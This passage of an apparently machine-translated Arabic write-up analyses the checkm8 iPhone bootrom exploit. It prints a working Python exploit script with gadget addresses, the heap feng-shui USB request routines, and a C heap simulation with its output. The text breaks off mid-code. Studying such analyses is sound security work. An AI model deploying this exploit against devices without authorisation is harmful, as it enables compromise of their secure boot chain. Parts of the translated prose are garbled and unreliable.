ุฃู ุดูุก ุฎูุงู ุงูุชูุฑุงุฑ ุงูุชุงูู <code>DFU</code> ุ  ูุจู ุชููุฆุฉ ุฃุฎุฑู <code>DFU</code> ุ ูุชู ุชุญุฑูุฑ ุฌููุน ุงูููุงุฑุฏ ุงููุฎุตุตุฉ ุณุงุจููุง ููุฌุจ ุฃู ูููู ุชุฎุตูุต ุงูุฐุงูุฑุฉ ูู ุชูุฑุงุฑ ุฌุฏูุฏ ูู ููุณู ุชูุงููุง.  ููุง ุงุชุถุญ ุ ููุงู ุฎุทุฃ ุขุฎุฑ ูุซูุฑ ููุชุณุฑุจ ูู ุงูุฐุงูุฑุฉ ูุชูุญ ุงุณุชุบูุงู <code>use-after-free</code> . </p><br><h2 id="analysis-of-checkm8" style=";text-align:right;direction:rtl">  ุชุญููู checkm8 </h2><br><p style=";text-align:right;direction:rtl">  ููุง ุจูุง ุฅูู <code>checkm8</code> ููุณู.  ูู ุฃุฌู ุงูุนุฑุถ ุงูุชูุถูุญู ุ ุณูู ูุณุชุฎุฏู ูุณุฎุฉ ูุจุณุทุฉ ูู ุงูุงุณุชุบูุงู ูุฌูุงุฒ <code>iPhone 7</code> ุ ุญูุซ ุฃุฎุฑุฌูุง ุฌููุน ุงูุดูุฑุงุช ุงููุชุนููุฉ ุจุงูููุตุงุช ุงูุฃุฎุฑู ููููุง ุจุชุบููุฑ ุชุฑุชูุจ ูุฃููุงุน ุทูุจุงุช <code>USB</code> ุฏูู ุฃู ุถุฑุฑ ููุธุงุฆูู.  ููุฏ ุชุฎูุตูุง ุฃูุถูุง ูู ุนูููุฉ ุจูุงุก ุญูููุฉ ุ ูุงูุชู ูููู ุงูุนุซูุฑ ุนูููุง ูู ุงูููู ุงูุฃุตูู ุ <code>checkm8.py</code> .  ูู ุงูุณูู ุชุญุฏูุฏ ุงูุงุฎุชูุงูุงุช ุจูู ุงูุฅุตุฏุงุฑุงุช ููุฃุฌูุฒุฉ ุงูุฃุฎุฑู. </p><br><pre style=";text-align:right;direction:rtl"> <code class="python hljs"><span class="hljs-comment"><span class="hljs-comment">#!/usr/bin/env python from checkm8 import * def main(): print '*** checkm8 exploit by axi0mX ***' device = dfu.acquire_device(1800) start = time.time() print 'Found:', device.serial_number if 'PWND:[' in device.serial_number: print 'Device is already in pwned DFU Mode. Not executing exploit.' return payload, _ = exploit_config(device.serial_number) t8010_nop_gadget = 0x10000CC6C callback_chain = 0x1800B0800 t8010_overwrite = '\0' * 0x5c0 t8010_overwrite += struct.pack('&lt;32x2Q', t8010_nop_gadget, callback_chain) # heap feng-shui stall(device) leak(device) for i in range(6): no_leak(device) dfu.usb_reset(device) dfu.release_device(device) # set global state and restart usb device = dfu.acquire_device() device.serial_number libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, 'A' * 0x800, 0.0001) libusb1_no_error_ctrl_transfer(device, 0x21, 4, 0, 0, 0, 0) dfu.release_device(device) time.sleep(0.5) # heap occupation device = dfu.acquire_device() device.serial_number stall(device) leak(device) leak(device) libusb1_no_error_ctrl_transfer(device, 0, 9, 0, 0, t8010_overwrite, 50) for i in range(0, len(payload), 0x800): libusb1_no_error_ctrl_transfer(device, 0x21, 1, 0, 0, payload[i:i+0x800], 50) dfu.usb_reset(device) dfu.release_device(device) device = dfu.acquire_device() if 'PWND:[checkm8]' not in device.serial_number: print 'ERROR: Exploit failed. Device did not enter pwned DFU Mode.' sys.exit(1) print 'Device is now in pwned DFU Mode.' print '(%0.2f seconds)' % (time.time() - start) dfu.release_device(device) if __name__ == '__main__': main()</span></span></code> </pre> <br><p style=";text-align:right;direction:rtl">  ุชุดุบูู <code>checkm8</code> ูู ุนุฏุฉ ูุฑุงุญู: </p><br><ol style=";text-align:right;direction:rtl"><li style=";text-align:right;direction:rtl">  ูููุฉ ููุบ ุดูู </li><li style=";text-align:right;direction:rtl">  ุชุฎุตูุต ูุชุญุฑูุฑ ุงููุฎุฒู ุงููุคูุช <code>IO</code> ุฏูู ูุณุญ ุงูุญุงูุฉ ุงูุนููููุฉ </li><li style=";text-align:right;direction:rtl">  ุงููุชุงุจุฉ ููู <code>usb_device_io_request</code> ูู ุงููููุฉ ูุน <code>use-after-free</code> </li><li style=";text-align:right;direction:rtl">  ูุถุน ุงูุญูููุฉ </li><li style=";text-align:right;direction:rtl">  ุชูููุฐ <code>callback-chain</code> </li><li style=";text-align:right;direction:rtl">  ุชูููุฐ <code>shellcode</code> </li></ol><br><p style=";text-align:right;direction:rtl">  ุฏุนููุง ููุธุฑ ูู ุฌููุน ุงููุฑุงุญู ุจุงูุชูุตูู. </p><br><h2 id="1-heap-feng-shui" style=";text-align:right;direction:rtl">  1. ูููุฉ ููุบ ุดูู </h2><br><p style=";text-align:right;direction:rtl">  ูุนุชูุฏ ุฃููุง ุงููุฑุญูุฉ ุงูุฃูุซุฑ ุฅุซุงุฑุฉ ููุงูุชูุงู ุ ูุฐูู ุณููุถู ูุฒูุฏูุง ูู ุงูููุช ูู ูุตููุง. </p><br><pre style=";text-align:right;direction:rtl"> <code class="python hljs">stall(device) leak(device) <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">6</span></span>): no_leak(device) dfu.usb_reset(device) dfu.release_device(device)</code> </pre> <br><p style=";text-align:right;direction:rtl">  ูุฐู ุงููุฑุญูุฉ ุถุฑูุฑูุฉ ูุชุฑุชูุจ ุงููููุฉ ุจุทุฑููุฉ ูููุฏุฉ ูุงุณุชุบูุงู <code>use-after-free</code> .  ุฃููุงู ุ ุฏุนูุง <code>no_leak</code> ุงูููุงููุงุช ุ ุฃู <code>leak</code> ุ ุฃู <code>no_leak</code> : </p><br><pre style=";text-align:right;direction:rtl"> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">stall</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(device)</span></span></span><span class="hljs-function">:</span></span> libusb1_async_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0x80</span></span>, <span class="hljs-number"><span class="hljs-number">6</span></span>, <span class="hljs-number"><span class="hljs-number">0x304</span></span>, <span class="hljs-number"><span class="hljs-number">0x40A</span></span>, <span class="hljs-string"><span class="hljs-string">'A'</span></span> * <span class="hljs-number"><span class="hljs-number">0xC0</span></span>, <span class="hljs-number"><span class="hljs-number">0.00001</span></span>) <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">leak</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(device)</span></span></span><span class="hljs-function">:</span></span> libusb1_no_error_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0x80</span></span>, <span class="hljs-number"><span class="hljs-number">6</span></span>, <span class="hljs-number"><span class="hljs-number">0x304</span></span>, <span class="hljs-number"><span class="hljs-number">0x40A</span></span>, <span class="hljs-number"><span class="hljs-number">0xC0</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>) <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">no_leak</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(device)</span></span></span><span class="hljs-function">:</span></span> libusb1_no_error_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0x80</span></span>, <span class="hljs-number"><span class="hljs-number">6</span></span>, <span class="hljs-number"><span class="hljs-number">0x304</span></span>, <span class="hljs-number"><span class="hljs-number">0x40A</span></span>, <span class="hljs-number"><span class="hljs-number">0xC1</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>)</code> </pre> <br><p style=";text-align:right;direction:rtl">  <code>libusb1_no_error_ctrl_transfer</code> ุนุจุงุฑุฉ ุนู ุบูุงู ูุจุฑูุงูุฌ <code>device.ctrlTransfer</code> ูุชุฌุงูู ุฌููุน ุงูุงุณุชุซูุงุกุงุช ุงููุงุดุฆุฉ ุฃุซูุงุก ุชูููุฐ ุงูุทูุจ.  <code>libusb1_async_ctrl_transfer</code> ุนุจุงุฑุฉ ุนู ูุฌููุน ููุฏุงูุฉ <code>libusb</code> ูู <code>libusb</code> ููุชูููุฐ ุบูุฑ ุงููุชุฒุงูู ู reqeust. </p><br><p style=";text-align:right;direction:rtl">  ูุชู ุชูุฑูุฑ ุงููุนููุงุช ุงูุชุงููุฉ ุฅูู ูุฐู ุงูููุงููุงุช: </p><br><ul style=";text-align:right;direction:rtl"><li style=";text-align:right;direction:rtl">  ุฑูู ุงูุฌูุงุฒ </li><li style=";text-align:right;direction:rtl">  ุจูุงูุงุช ุญุฒูุฉ <code>SETUP</code> (ููุง ููููู ุงูุนุซูุฑ ุนูู <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ุงููุตู</a> ): <br><ul style=";text-align:right;direction:rtl"><li style=";text-align:right;direction:rtl"> <code>bmRequestType</code> </li> <li style=";text-align:right;direction:rtl"> <code>bRequest</code> </li> <li style=";text-align:right;direction:rtl"> <code>wValue</code> </li> <li style=";text-align:right;direction:rtl"> <code>wIndex</code> </li> </ul></li><li style=";text-align:right;direction:rtl">  ุทูู ุงูุจูุงูุงุช ( <code>wLength</code> ) ุฃู <code>Data Stage</code> </li><li style=";text-align:right;direction:rtl">  ุทูุจ ูููุฉ </li></ul><br><p style=";text-align:right;direction:rtl">  ุชุชู ูุดุงุฑูุฉ ุงููุณุงุฆุท <code>bmRequestType</code> ู <code>bRequest</code> ู <code>wValue</code> ู <code>wIndex</code> ุจูุงุณุทุฉ ุฌููุน ุฃููุงุน ุงูุทูุจุงุช ุงูุซูุงุซุฉ: </p><br><ul style=";text-align:right;direction:rtl"><li style=";text-align:right;direction:rtl"> <code>bmRequestType = 0x80</code> <br> <ul style=";text-align:right;direction:rtl"><li style=";text-align:right;direction:rtl">  <code>0b1XXXXXXX</code> - ุงุชุฌุงู <code>Data Stage</code> (ุฌูุงุฒ ูุถูู) </li><li style=";text-align:right;direction:rtl">  <code>0bX00XXXXX</code> - ููุน ุงูุทูุจ ุงูููุงุณู </li><li style=";text-align:right;direction:rtl">  <code>0bXXX00000</code> - ุงูุฌูุงุฒ ูู ูุณุชูู ุงูุทูุจ </li></ul></li><li style=";text-align:right;direction:rtl">  <code>bRequest = 6</code> - ุทูุจ ุงูุญุตูู ุนูู ูุงุตู ( <code>GET_DESCRIPTOR</code> ) </li><li style=";text-align:right;direction:rtl"> <code>wValue = 0x304</code> <br> <ul style=";text-align:right;direction:rtl"><li style=";text-align:right;direction:rtl">  <code>wValueHigh = 0x3</code> - ูุญุฏุฏ ููุน ูุงุตู - ุณูุณูุฉ ( <code>USB_DT_STRING</code> ) </li><li style=";text-align:right;direction:rtl">  <code>wValueLow = 0x4</code> - ูุคุดุฑ ูุงุตู ุงูุณูุณูุฉ ุ 4 ุ ูุชูุงูู ูุน ุงูุฑูู ุงูุชุณูุณูู ููุฌูุงุฒ (ูู ูุฐู ุงูุญุงูุฉ ุ ุงูุณูุณูุฉ ูู <code>CPID:8010 CPRV:11 CPFM:03 SCEP:01 BDID:0C ECID:001A40362045E526 IBFL:3C SRTG:[iBoot-2696.0.0.1.33]</code> ) </li></ul></li><li style=";text-align:right;direction:rtl">  <code>wIndex = 0x40A</code> - <code>wIndex = 0x40A</code> ุงูุณูุณูุฉ ุ ูุงูุชู ูุง ุชุชุนูู ูููุชูุง ุจุงูุงุณุชุบูุงู ููููู ุชุบููุฑูุง. </li></ul><br><p style=";text-align:right;direction:rtl">  ูุฃู ูู ูุฐู ุงูุทูุจุงุช ุ ูุชู ุชุฎุตูุต 0x30 ุจุงูุช ูู ูููุฉ ุงูุฐุงูุฑุฉ ุงููุคูุชุฉ ููุงุฆู ุงูุจููุฉ ุงูุชุงููุฉ: </p><br><p style=";text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/-e/ub/wb/-eubwbh-2fhsjb9bs36t0qom7be.png"></p><br><p style=";text-align:right;direction:rtl">  ุงูุญููู ุงูุฃูุซุฑ ุฅุซุงุฑุฉ ููุฐุง ุงููุงุฆู ูู <code>callback</code> <code>next</code> . </p><br><ul style=";text-align:right;direction:rtl"><li style=";text-align:right;direction:rtl">  <code>callback</code> ูู ุงููุคุดุฑ ุฅูู ุงูุฏุงูุฉ ุงูุชู ุณูุชู ุงุณุชุฏุนุงุคูุง ุนูุฏ ุงูุงูุชูุงุก ูู ุงูุทูุจ. </li><li style=";text-align:right;direction:rtl">  <code>next</code> ูู ุงููุคุดุฑ ุฅูู ุงููุงุฆู ุงูุชุงูู ูู ููุณ ุงูููุน ุ  ูู ุงูุถุฑูุฑู ุชูุธูู ูุงุฆูุฉ ุงูุชุธุงุฑ ุงูุทูุจ. </li></ul><br><p style=";text-align:right;direction:rtl">  ุงูููุฒุฉ ุงูุฑุฆูุณูุฉ <code>stall</code> ูู ุงุณุชุฎุฏุงูู ููุชูููุฐ ุบูุฑ ุงููุชุฒุงูู ูุทูุจ ูุน ุงูุญุฏ ุงูุฃุฏูู ูู ุงููููุฉ.  ููุฐุง ุงูุณุจุจ ุ ุฅุฐุง ููุง ูุญุธูุธูู ุ ูุณูุชู ุฅูุบุงุก ุงูุทูุจ ุนูู ูุณุชูู ูุธุงู ุงูุชุดุบูู ููุจูู ูู ูุงุฆูุฉ ุงูุชุธุงุฑ ุงูุชูููุฐ ุ ููู ุชูุชูู ุงููุนุงููุฉ.  ุจุงูุฅุถุงูุฉ ุฅูู ุฐูู ุ ุณูุณุชูุฑ ุงูุฌูุงุฒ ูู ุชููู ุฌููุน ุญุฒู <code>SETUP</code> ุงููุงุฏูุฉ ููุถุนูุง ุ ุนูุฏ ุงูุถุฑูุฑุฉ ุ ูู ูุงุฆูุฉ ุงูุชุธุงุฑ ุงูุชูููุฐ.  ูู ููุช ูุงุญู ุ ุนูุฏ ุชุฌุฑุจุฉ ูุญุฏุฉ ุชุญูู <code>USB</code> ูู <code>Arduino</code> ุ ุงูุชุดููุง ุฃูู ูู ุฃุฌู ุงูุงุณุชุบูุงู ุงููุงุฌุญ ุ ูุญุชุงุฌ ุฅูู ุงููุถูู ูุฅุฑุณุงู ุญุฒูุฉ <code>SETUP</code> ูุฑูุฒ <code>IN</code> ุ ูุจุนุฏ ุฐูู ูุฌุจ ุฅูุบุงุก ุงููุนุงููุฉ ุจุณุจุจ ุงูุชูุงุก ุงููููุฉ.  ุชุจุฏู ูุฐู ุงููุนุงููุฉ ุบูุฑ ุงูููุชููุฉ ููุง ููู: </p><br><div style="text-align:center;;text-align:right;direction:rtl"><img width="500" src="https://habrastorage.org/webt/sh/zq/ia/shzqiacghex3lk7jc9nhgoz3m7g.png"></div><br><p style=";text-align:right;direction:rtl">  ุฅูู ุฌุงูุจ ุฐูู ุ ุชุฎุชูู ุงูุทูุจุงุช ููุท ูู ุงูุทูู ุจูุงุณุทุฉ ูุญุฏุฉ ูุงุญุฏุฉ.  ุจุงููุณุจุฉ ููุทูุจุงุช ุงูููุงุณูุฉ ุ ููุฌุฏ <code>callback</code> ุงุชุตุงู ููุงุณู ูุจุฏู ููุง ููู: </p><br><p style=";text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/cx/as/gn/cxasgnrqyant31ostgflo85zxro.png"></p><br><p style=";text-align:right;direction:rtl">  ูููุฉ <code>io_length</code> ุชุณุงูู ุงูุญุฏ ุงูุฃุฏูู ูู <code>wLength</code> ูู ุญุฒูุฉ <code>SETUP</code> ููุทูุจ ูุงูุทูู ุงูุฃุตูู <code>wLength</code> ุงููุทููุจ.  ูุธุฑูุง ูููู ุงููุงุตู ุทููููุง ุฌุฏูุง ุ ูููููุง ุงูุชุญูู ูู ูููุฉ <code>io_length</code> ุถูู ุทููู.  ูููุฉ <code>g_setup_request.wLength</code> ุชุณุงูู ูููุฉ <code>wLength</code> ูู ุญุฒูุฉ <code>SETUP</code> ุงูุฃุฎูุฑุฉ.  ูู ูุฐู ุงูุญุงูุฉ ุ ูููู <code>0xC1</code> . </p><br><p style=";text-align:right;direction:rtl">  ูุจุงูุชุงูู ุ ูุชู ุฅููุงู ุงูุทูุจุงุช ุงูุชู ุชู ุชุดููููุง ุจูุงุณุทุฉ <code>stall</code> ุงูููุงููุงุช <code>usb_core_send_zlp()</code> ุ ููุชู ุงุณุชููุงุก ุงูุดุฑุท ูู ูุธููุฉ <code>callback</code> ุงูุทุฑูู ุ ููุชู <code>usb_core_send_zlp()</code> .  ุชููู ูุฐู ุงูููุงููุฉ ุจุฅูุดุงุก ุญุฒูุฉ ูุงุฑุบุฉ (ุญุฒูุฉ <code>zero-length-packet</code> ) ูุชุถูููุง ุฅูู ูุงุฆูุฉ ุงูุชุธุงุฑ ุงูุชูููุฐ.  ูุนุฏ ุฐูู ุถุฑูุฑููุง ูุฅููุงู ุงููุนุงููุฉ ุจุดูู ุตุญูุญ ูู <code>Status Stage</code> . </p><br><p style=";text-align:right;direction:rtl">  ูุชู ุฅููุงู ุงูุทูุจ ุนู ุทุฑูู ุงุณุชุฏุนุงุก ุงููุธููุฉ <code>usb_core_complete_endpoint_io</code> .  ุฃููุงู ุ ูุณุชุฏุนู <code>callback</code> ุซู ูุญุฑุฑ ุฐุงูุฑุฉ ุงูุทูุจ.  ุงูุชูู ุงูุทูุจ ููุณ ููุท ุนูุฏ ุงูุชูุงู ุงููุนุงููุฉ ุจุงููุงูู ุ ูููู ุฃูุถูุง ุนูุฏ ุฅุนุงุฏุฉ ุชุนููู <code>USB</code> .  ุนูุฏ ุชููู ุฅุดุงุฑุฉ ุฅุนุงุฏุฉ ุชุนููู <code>USB</code> ุ ุณูุชู ุฅููุงู ุฌููุน ุงูุทูุจุงุช ูู ูุงุฆูุฉ ุงูุชุธุงุฑ ุงูุชูููุฐ. </p><br><p style=";text-align:right;direction:rtl">  ุนู ุทุฑูู ุงูุงุชุตุงู ุจุดูู ุงูุชูุงุฆู ุจู <code>usb_core_send_zlp()</code> ุนูุฏ ุงูุงูุชูุงู ุฅูู ูุงุฆูุฉ ุงูุชุธุงุฑ ุงูุชูููุฐ ูุชุญุฑูุฑ ุงูุทูุจุงุช ุจุนุฏ ุฐูู ุ ูููููุง ุงูุญุตูู ุนูู ุชุญูู ูุงูู ูู ูููุฉ ุงูุฐุงูุฑุฉ ุงููุคูุชุฉ ูุงุณุชุบูุงู <code>use-after-free</code> .  ุฃููุงู ุ ุฏุนูุง ููุธุฑ ุฅูู ุญููุฉ ุชูุธูู ุงูุทูุจ: </p><br><p style=";text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/ik/tn/ym/iktnymzi4lywmtf1xsmcfsgpyb4.png"></p><br><p style=";text-align:right;direction:rtl">  ููุง ุชุฑูู ุ ูุชู ุฅูุฑุงุบ ูุงุฆูุฉ ุงูุงูุชุธุงุฑ ุ ุซู ูุชู ุชุดุบูู ุงูุทูุจุงุช ุงูููุบุงุฉ <code>usb_core_complete_endpoint_io</code> ุจูุงุณุทุฉ <code>usb_core_complete_endpoint_io</code> .  ูุชู ูุถุน ุงูุทูุจุงุช ุงููุฎุตุตุฉ ุจูุงุณุทุฉ <code>usb_core_send_zlp</code> ูู <code>ep-&gt;io_head</code> .  ุจุนุฏ ุงูุงูุชูุงุก ูู ุฅุนุงุฏุฉ ุชุนููู <code>USB</code> ุ ุณุชููู ุฌููุน ุงููุนูููุงุช ุญูู ููุทุฉ ุงูููุงูุฉ ูุงุถุญุฉ ุ ุจูุง ูู ุฐูู ุงููุคุดุฑุงุช <code>io_head</code> ู <code>io_tail</code> ุ <code>io_tail</code> ุงูุทูุจุงุช ุฐุงุช ุงูุทูู ุงูุตูุฑู ูู ุงููููุฉ.  ูุจุงูุชุงูู ุ ูููููุง ุฅูุดุงุก ูุทุนุฉ ุตุบูุฑุฉ ูุณุท ุงููููุฉ.  ููุถุญ ุงููุฎุทุท ุฃุฏูุงู ููู ูุชู ุฐูู: </p><br><p style=";text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/jl/rj/v5/jlrjv55cw23fehubgo7hsqmv68w.png"></p><br><p style=";text-align:right;direction:rtl">  ูู ูููุฉ <code>SecureROM</code> ุ ูุชู ุชุฎุตูุต ููุทูุฉ ุฐุงูุฑุฉ ุฌุฏูุฏุฉ ูู ุฃุตุบุฑ ูุทุนุฉ ุญุฑุฉ ููุงุณุจุฉ.  ูู ุฎูุงู ุฅูุดุงุก ุฌุฒุก ุตุบูุฑ ูุฌุงูู ุจุงุณุชุฎุฏุงู ุงูุทุฑููุฉ ุงูููุถุญุฉ ุฃุนูุงู ุ ูููููุง ุงูุชุญูู ูู ุชุฎุตูุต ุงูุฐุงูุฑุฉ ุฃุซูุงุก ุชููุฆุฉ <code>USB</code> ุ ุจูุง ูู ุฐูู ุชุฎุตูุต <code>io_buffer</code> ูุงูุทูุจุงุช. </p><br><p style=";text-align:right;direction:rtl">  ููุญุตูู ุนูู ููู ุฃูุถู ููุฐุง ุ ุฏุนููุง ูุฑู ุงูุทูุจุงุช ุงูุชู ูุชู ุฅุฌุฑุงุคูุง ุนูู ุงููููุฉ ุนูุฏ ุชููุฆุฉ <code>DFU</code> .  ุฃุซูุงุก ุชุญููู ุดูุฑุฉ ูุตุฏุฑ <code>iBoot</code> ูุงูููุฏุณุฉ ุงูุนูุณูุฉ ูู <code>SecureROM</code> ุ ุญุตููุง ุนูู ุงูุชุณูุณู ุงูุชุงูู: </p><br><ul style=";text-align:right;direction:rtl"><li style=";text-align:right;direction:rtl"><ol style=";text-align:right;direction:rtl"><li style=";text-align:right;direction:rtl">  ุชุฎุตูุต ูุฎุชูู ูุงุตูุงุช ุงูุณูุณูุฉ <br><ul style=";text-align:right;direction:rtl"><li style=";text-align:right;direction:rtl">  1.1.  <code>Nonce</code> (ุงูุญุฌู <code>234</code> ) </li><li style=";text-align:right;direction:rtl">  1.2.  <code>Manufacturer</code> ( <code>22</code> ) </li><li style=";text-align:right;direction:rtl">  1.3.  <code>Product</code> ( <code>62</code> ) </li><li style=";text-align:right;direction:rtl">  1.4.  <code>Serial Number</code> ( <code>198</code> ) </li><li style=";text-align:right;direction:rtl">  1.5.  <code>Configuration string</code> ( <code>62</code> ) </li></ul></li></ol><br></li><li style=";text-align:right;direction:rtl"><ol style=";text-align:right;direction:rtl"><li style=";text-align:right;direction:rtl">  ุงููุฎุตุตุงุช ุงููุชุนููุฉ ุจุฅูุดุงุก ูููุฉ ูุญุฏุฉ ุชุญูู <code>USB</code> <br><ul style=";text-align:right;direction:rtl"><li style=";text-align:right;direction:rtl">  2.1.  ูููู ุงููููุฉ ( <code>0x3c0</code> ) </li><li style=";text-align:right;direction:rtl">  2.2.  ููุฏุณ ุงูููุงู ( <code>0x1000</code> ) </li></ul></li></ol><br></li><li style=";text-align:right;direction:rtl"><ol style=";text-align:right;direction:rtl"><li style=";text-align:right;direction:rtl">  <code>io_buffer</code> ( <code>0x800</code> ) </li></ol><br></li><li style=";text-align:right;direction:rtl"><ol style=";text-align:right;direction:rtl"><li style=";text-align:right;direction:rtl">  ูุงุตูุงุช ุงูุชูููู <br><ul style=";text-align:right;direction:rtl"><li style=";text-align:right;direction:rtl">  4.1.  <code>High-Speed</code> ( <code>25</code> ) </li><li style=";text-align:right;direction:rtl">  4.2.  <code>Full-Speed</code> ( <code>25</code> ) </li></ul></li></ol><br></li></ul><br><p style=";text-align:right;direction:rtl">  ุซู ุ ูุชู ุชุฎุตูุต ููุงูู ุงูุทูุจ.  ุฅุฐุง ูุงู ููุงู ุฌุฒุก ุตุบูุฑ ูู ุงููููุฉ ุ ูุณุชุฐูุจ ุจุนุถ ูุฎุตุตุงุช ุงููุฆุฉ ุงูุฃููู ุฅูู ููุงู ุ ูุณุชุชุญุฑู ุฌููุน ุงูุชุฎุตูุตุงุช ุงูุฃุฎุฑู.  ูุจุงูุชุงูู ุ ุณูููู ูุงุฏุฑูู ุนูู ุชุฌุงูุฒ <code>usb_device_io_request</code> ุจุงูุฑุฌูุน ุฅูู ุงููุฎุฒู ุงููุคูุช ุงููุฏูู.  ูุจุฏู ูุซู ูุฐุง: </p><br><p style=";text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/on/dl/dy/ondldygtgie2sho2l8xh8q5mlva.png"></p><br><p style=";text-align:right;direction:rtl">  ูุญุณุงุจ ุงูุฅุฒุงุญุฉ ุงููุงุฒูุฉ ุ ูููุง ุจุจุณุงุทุฉ ุจูุถุงูุงุฉ ุฌููุน ุงูุชุฎุตูุตุงุช ุงููุฐููุฑุฉ ุฃุนูุงู <code>iBoot</code> ุงูุชุนูููุงุช ุงูุจุฑูุฌูุฉ ุงููุตุฏุฑ <code>iBoot</code> ููููุงู. </p><br><div class="spoiler" style=";text-align:right;direction:rtl">  <b class="spoiler_title">ูุญุงูุงุฉ ุงูุทูุจุงุช ุฅูู ุงููููุฉ ูู DFU</b> <div class="spoiler_text" style=";text-align:right;direction:rtl"><pre style=";text-align:right;direction:rtl"> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">"heap.h"</span></span></span><span class="hljs-meta"> #</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/mman.h&gt; #ifndef NOLEAK #define NOLEAK (8) #endif int main() { void * chunk = mmap((void *)0x1004000, 0x100000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0); printf("chunk = %p\n", chunk); heap_add_chunk(chunk, 0x100000, 1); malloc(0x3c0); // alignment of the low order bytes of addresses in SecureRAM void * descs[10]; void * io_req[100]; descs[0] = malloc(234); descs[1] = malloc(22); descs[2] = malloc(62); descs[3] = malloc(198); descs[4] = malloc(62); const int N = NOLEAK; void * task = malloc(0x3c0); void * task_stack = malloc(0x4000); void * io_buf_0 = memalign(0x800, 0x40); void * hs = malloc(25); void * fs = malloc(25); void * zlps[2]; for(int i = 0; i &lt; N; i++) { io_req[i] = malloc(0x30); } for(int i = 0; i &lt; N; i++) { if(i &lt; 2) { zlps[i] = malloc(0x30); } free(io_req[i]); } for(int i = 0; i &lt; 5; i++) { printf("descs[%d] = %p\n", i, descs[i]); } printf("task = %p\n", task); printf("task_stack = %p\n", task_stack); printf("io_buf = %p\n", io_buf_0); printf("hs = %p\n", hs); printf("fs = %p\n", fs); for(int i = 0; i &lt; 2; i++) { printf("zlps[%d] = %p\n", i, zlps[i]); } printf("**********\n"); for(int i = 0; i &lt; 5; i++) { free(descs[i]); } free(task); free(task_stack); free(io_buf_0); free(hs); free(fs); descs[0] = malloc(234); descs[1] = malloc(22); descs[2] = malloc(62); descs[3] = malloc(198); descs[4] = malloc(62); task = malloc(0x3c0); task_stack = malloc(0x4000); void * io_buf_1 = memalign(0x800, 0x40); hs = malloc(25); fs = malloc(25); for(int i = 0; i &lt; 5; i++) { printf("descs[%d] = %p\n", i, descs[i]); } printf("task = %p\n", task); printf("task_stack = %p\n", task_stack); printf("io_buf = %p\n", io_buf_1); printf("hs = %p\n", hs); printf("fs = %p\n", fs); for(int i = 0; i &lt; 5; i++) { io_req[i] = malloc(0x30); printf("io_req[%d] = %p\n", i, io_req[i]); } printf("**********\n"); printf("io_req_off = %#lx\n", (int64_t)io_req[0] - (int64_t)io_buf_0); printf("hs_off = %#lx\n", (int64_t)hs - (int64_t)io_buf_0); printf("fs_off = %#lx\n", (int64_t)fs - (int64_t)io_buf_0); return 0; }</span></span></span></span></code> </pre> </div></div><br><p style=";text-align:right;direction:rtl">  ุฅุฎุฑุงุฌ ุงูุจุฑูุงูุฌ ูุน 8 ุทูุจุงุช ูู ูุฑุญูุฉ <code>heap feng-shui</code> : </p><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">chunk = 0x1004000 descs[0] = 0x1004480 descs[1] = 0x10045c0 descs[2] = 0x1004640 descs[3] = 0x10046c0 descs[4] = 0x1004800 task = 0x1004880 task_stack = 0x1004c80 io_buf = 0x1008d00 hs = 0x1009540 fs = 0x10095c0 zlps[0] = 0x1009a40 zlps[1] = 0x1009640 ********** descs[0] = 0x10096c0 descs[1] = 0x1009800 descs[2] = 0x1009880 descs[3] = 0x1009900 descs[4] = 0x1004480 task = 0x1004500 task_stack = 0x1004900 io_buf = 0x1008980 hs = 0x10091c0 fs = 0x1009240 io_req[0] = 0x10092c0 io_req[1] = 0x1009340 io_req[2] = 0x10093c0 io_req[3] = 0x1009440 io_req[4] = 0x10094c0 ********** io_req_off = 0x5c0 hs_off = 0x4c0 fs_off = 0x540</code> </pre> <br><p style=";text-align:right;direction:rtl">  ููุง ุชุฑูู ุ <code>usb_device_io_request</code> ุขุฎุฑ ุนูุฏ ุฅุฒุงุญุฉ <code>0x5c0</code> ูู ุจุฏุงูุฉ ุงููุฎุฒู ุงููุคูุช ุงูุณุงุจู ุ ูุงูุฐู ูุชูุงูู ูุน ุฑูุฒ ุงูุงุณุชุบูุงู: </p><br><pre style=";text-align:right;direction:rtl"> <code class="python hljs">t8010_overwrite = <span class="hljs-string"><span class="hljs-string">'\0'</span></span> * 